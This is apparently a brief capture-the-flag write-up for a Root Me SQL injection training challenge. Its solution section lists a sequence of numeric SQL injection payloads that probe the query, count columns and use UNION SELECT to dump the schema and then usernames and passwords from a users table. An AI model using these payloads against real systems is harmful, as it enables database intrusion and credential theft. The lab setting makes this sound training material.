---
title: "SQL injection - Numeric"
tags:
    - Lab
    - Root Me
date: "2024-06-22"
thumbnail: "/assets/img/thumbnail/sqli.jpg"
bookmark: true
---
## Description

Retrieve the administrator password.

 <a href="http://challenge01.root-me.org/web-serveur/ch18/">Challange Link</a>

## Fast Solution


* id=3'
* id=3 order by 5 -- -
* id=3 union select 1,2,3 from sqlite_master -- -
* id=3 union select 1,sql,name from sqlite_master — –
* id=3 union select 1,username,password from users– –
